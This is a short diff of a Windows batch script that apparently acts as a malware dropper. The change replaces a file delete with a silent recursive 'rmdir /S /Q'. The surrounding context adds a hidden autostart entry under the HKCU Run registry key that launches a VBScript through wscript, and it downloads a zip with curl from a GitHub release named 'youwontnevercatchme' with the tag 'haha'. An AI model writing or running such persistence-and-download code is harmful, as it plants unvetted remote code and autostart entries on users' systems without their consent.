@@ -1,6 +1,6 @@
 set ourdirectory=%cd%
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Launcher" /t REG_SZ /d "wscript.exe \"%ourdirectory%\\launcher.vbs\"" /f
-del ch2
+rmdir /S /Q ch2
 mkdir ch2
 cd ch2
 curl -L -o "chv2.zip" "https://github.com/youwontnevercatchme/files/releases/download/haha/chv2.zip"
